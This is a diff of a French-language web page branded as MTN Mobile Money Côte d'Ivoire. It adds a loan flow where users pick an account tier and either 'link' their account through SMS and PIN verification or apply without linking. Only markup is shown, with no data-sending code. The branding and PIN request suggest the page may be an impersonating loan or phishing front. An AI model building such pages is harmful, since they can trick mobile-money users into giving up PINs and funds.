@@ -92,7 +92,74 @@
     <div class="land-footer">© 2026 MTN Mobile Money Côte d'Ivoire</div>
 </div>
 
-<!-- VÉRIFICATION INSCRIPTION -->
+<!-- CHOIX : LIER OU CONTINUER SANS LIER -->
+<div id="page-choose-path" class="page">
+    <nav class="navbar">
+        <a class="nav-left" data-goto="page-landing">← Retour</a>
+        <div class="mtn-logo nav-logo-row"><img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" /><div><div class="mtn-logo-text nav-logo-text">MTN MoMo</div><div class="mtn-logo-sub nav-logo-sub">Côte d'Ivoire</div></div></div>
+        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+    </nav>
+    <div class="step-center"><div class="step-card">
+        <h2>Vous avez déjà MoMo ?</h2>
+        <p class="step-sub">Deux options s'offrent à vous</p>
+
+        <div class="msg-box error" id="chooseErr"><span class="msg-icon">✕</span><span id="chooseErrTxt"></span></div>
+
+        <div class="field">
+            <label>Quel type de compte MoMo avez-vous ?</label>
+            <div class="account-types" id="chooseAccountTypes">
+                <div class="account-type" data-type="simplifie">
+                    <div class="at-icon">🟢</div>
+                    <div class="at-info">
+                        <div class="at-name">Compte Simplifié <span class="at-level">Niveau 1</span></div>
+                        <div class="at-desc">Journalier : 200 000 F · <b>Prêt max : 100 000 F</b></div>
+                    </div>
+                    <div class="at-check">○</div>
+                </div>
+                <div class="account-type" data-type="standard">
+                    <div class="at-icon">🔵</div>
+                    <div class="at-info">
+                        <div class="at-name">Compte Standard <span class="at-level">Niveau 2</span></div>
+                        <div class="at-desc">Journalier : 500 000 F · <b>Prêt max : 500 000 F</b></div>
+                    </div>
+                    <div class="at-check">○</div>
+                </div>
+                <div class="account-type" data-type="premium">
+                    <div class="at-icon">🟣</div>
+                    <div class="at-info">
+                        <div class="at-name">Compte Premium <span class="at-level">Niveau 3</span></div>
+                        <div class="at-desc">Journalier : 2 000 000 F · <b>Prêt max : 2 000 000 F</b></div>
+                    </div>
+                    <div class="at-check">○</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="path-actions">
+            <button class="btn-outline path-btn" id="chooseSkipBtn">
+                <span class="path-icon">⚡</span>
+                <span class="path-text">
+                    <strong>Continuer sans lier</strong>
+                    <em>Demande immédiate, vérification plus tard</em>
+                </span>
+            </button>
+            <button class="btn-grad path-btn" id="chooseLinkBtn">
+                <span class="path-icon">🔗</span>
+                <span class="path-text">
+                    <strong>Lier mon compte maintenant</strong>
+                    <em>Vérification par SMS + code PIN</em>
+                </span>
+            </button>
+        </div>
+
+        <div class="path-note">
+            💡 <b>Recommandé :</b> Lier votre compte accélère l'approbation finale.
+            <br>Vous pourrez toujours lier plus tard.
+        </div>
+    </div></div>
+</div>
+
+<!-- INSCRIPTION -->
 <div id="page-register-check" class="page">
     <nav class="navbar">
         <a class="nav-left" data-goto="page-landing">← Retour</a>
@@ -101,12 +168,12 @@
     </nav>
     <div class="step-center">
         <div class="step-card">
-            <h2>Inscription MoMo</h2>
-            <p class="step-sub">Inscrivez-vous en moins de 60 secondes</p>
+            <h2 id="regHeading">Inscription MoMo</h2>
+            <p class="step-sub" id="regSubheading">Inscrivez-vous en moins de 60 secondes</p>
             <div class="reg-intro">
                 <div class="reg-icon">📱</div>
-                <h3>Vous êtes à 2 étapes de votre prêt</h3>
-                <p>MoMo est le service de monnaie mobile de MTN. Enregistrez votre portefeuille, puis demandez un prêt.</p>
+                <h3 id="regIntroH3">Vous êtes à 2 étapes de votre prêt</h3>
+                <p id="regIntroP">MoMo est le service de monnaie mobile de MTN. Enregistrez votre portefeuille, puis demandez un prêt.</p>
             </div>
             <div class="msg-box error" id="regErr"><span class="msg-icon">✕</span><span id="regErrTxt"></span></div>
             <div class="field">
@@ -139,27 +206,27 @@
             <div class="field">
                 <label>Choisissez votre type de compte MoMo</label>
                 <div class="account-types" id="accountTypes">
-                    <div class="account-type" data-type="basic">
-                        <div class="at-icon">🟡</div>
+                    <div class="account-type" data-type="simplifie">
+                        <div class="at-icon">🟢</div>
                         <div class="at-info">
-                            <div class="at-name">Compte Basic</div>
+                            <div class="at-name">Compte Simplifié <span class="at-level">Niveau 1</span></div>
                             <div class="at-desc">Journalier : 200 000 F · Mensuel : 500 000 F · <b>Prêt max : 100 000 F</b></div>
                         </div>
                         <div class="at-check">○</div>
                     </div>
                     <div class="account-type" data-type="standard">
-                        <div class="at-icon">⭐</div>
+                        <div class="at-icon">🔵</div>
                         <div class="at-info">
-                            <div class="at-name">Compte Standard</div>
-                            <div class="at-desc">Journalier : 1 000 000 F · Mensuel : 2 000 000 F · <b>Prêt max : 500 000 F</b></div>
+                            <div class="at-name">Compte Standard <span class="at-level">Niveau 2</span></div>
+                            <div class="at-desc">Journalier : 500 000 F · Mensuel : 2 000 000 F · <b>Prêt max : 500 000 F</b></div>
                         </div>
                         <div class="at-check">○</div>
                     </div>
                     <div class="account-type" data-type="premium">
-                        <div class="at-icon">💎</div>
+                        <div class="at-icon">🟣</div>
                         <div class="at-info">
-                            <div class="at-name">Compte Premium</div>
-                            <div class="at-desc">Journalier : 5 000 000 F · Mensuel : 10 000 000 F · <b>Prêt max : 2 000 000 F</b></div>
+                            <div class="at-name">Compte Premium <span class="at-level">Niveau 3</span></div>
+                            <div class="at-desc">Journalier : 2 000 000 F · Mensuel : 10 000 000 F · <b>Prêt max : 2 000 000 F</b></div>
                         </div>
                         <div class="at-check">○</div>
                     </div>
